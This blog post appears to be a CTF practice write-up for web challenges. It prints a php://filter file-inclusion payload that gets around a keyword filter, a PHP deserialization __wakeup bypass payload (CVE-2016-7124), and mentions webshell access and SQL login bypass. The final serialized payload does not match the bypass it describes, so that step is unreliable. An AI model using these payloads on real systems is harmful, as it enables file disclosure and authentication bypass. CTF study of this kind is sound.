---
title: buuoj刷题记录6-极客大挑战web1
date: 2020-01-02 20:49:17
tags:
- ctf
- 极客大挑战
- web
categories: 
 - 刷题记录
---

# 极客大挑战web

### Havefun

查看源码,发现提示

```html
                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
```

payload=`?cat=dog`

<!--more-->

![](/pic/9.png)

### EasySQL

万能密码直接获取结果

![](/pic/10.png)

### Knife

使用菜刀或者蚁剑连接 密码Syc

![](/pic/11.png)

flag在根目录下

### Secret File

查看源码

```html
<!DOCTYPE html>

<html>

<style type="text/css" >
#master {
    position:absolute;
    left:44%;
    bottom:0;
    text-align :center;
        }
        p,h1 {
                cursor: default;
        }
</style>

        <head>
                <meta charset="utf-8">
                <title>蒋璐源的秘密</title>
        </head>

        <body style="background-color:black;"><br><br><br><br><br><br>

            <h1 style="font-family:verdana;color:red;text-align:center;">你想知道蒋璐源的秘密么？</h1><br><br><br>

            <p style="font-family:arial;color:red;font-size:20px;text-align:center;">想要的话可以给你，去找吧！把一切都放在那里了！</p>
            <a id="master" href="./Archive_room.php" style="background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;">Oh! You found me</a>
            <div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
        </body>
</html>
```

点击其中的链接

```html
<!DOCTYPE html>

<html>

<style type="text/css" >
#master	{
    position:absolute;
    left:44%;
    bottom:20;
    text-align :center;
    	}
        p,h1 {
                cursor: default;
        }
</style>

	<head>
		<meta charset="utf-8">
		<title>绝密档案</title>
	</head>

	<body style="background-color:black;"><br><br><br><br><br><br>
		
		<h1 style="font-family:verdana;color:red;text-align:center;">
		我把他们都放在这里了，去看看吧		<br>
		</h1><br><br><br><br><br><br>
		<a id="master" href="./action.php" style="background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;">
			<font size=6>SECRET</font>
		</a>
	<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
	</body>

</html>
```

再次点击链接

```html
<!DOCTYPE html>

<html>
<style>
        p,h1 {
                cursor: default;
        }
</style>

	<head>
		<meta charset="utf-8">
		<title>END</title>
	</head>

	<body style="background-color:black;"><br><br><br><br><br><br>
		
		<h1 style="font-family:verdana;color:red;text-align:center;">查阅结束</h1><br><br><br>
		
		<p style="font-family:arial;color:red;font-size:20px;text-align:center;">没看清么？回去再仔细看看吧。</p>
		<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
	</body>

</html>
```

和之前南邮cft的一道web有点像

直接上burp suite

一直点，查看记录，发现有一个

![](/pic/12.png)

打开发现源码

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

`payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php`

将得到的base64解码

```php+HTML
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "æå°±å¨è¿é";
                $flag = 'flag{d144e819-346a-49ab-98e7-2fea0b2b9f6d}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</htmlPgo
```

### PHP

常规扫描手工or御剑，发现`www.zip`存在源码

class.php

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';    //此处需要绕过
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}

$a=new Name('admin',100);

var_dump(serialize($a));

?>
```

index.php中关键代码

```php
 <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

flag.php

```php
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>
```

分析后这是一个序列化+绕过`__wakeup()`  

`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。

`serialize()` 会检查是否存在一个 `__sleep()` 方法。如果存在，则会先调用 `__sleep()` 。

`CVE-2016-7124`提到`unserialize()` 绕过`__wakeup()`的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。

```php
<?php
class Name{
    private $username = 'admin';
    private $password = 100;

}
$a=new Name();
var_dump(urlencode(serialize($a))); //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
var_dump(serialize($a));//O:4:"Name":2:{s:14:"�Name�username";s:5:"admin";s:14:"�Name�password";i:100;}   
?>
```

因为有不可打印字符，所以选择经过URL编码后的

`payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`

![](/pic/13.png)

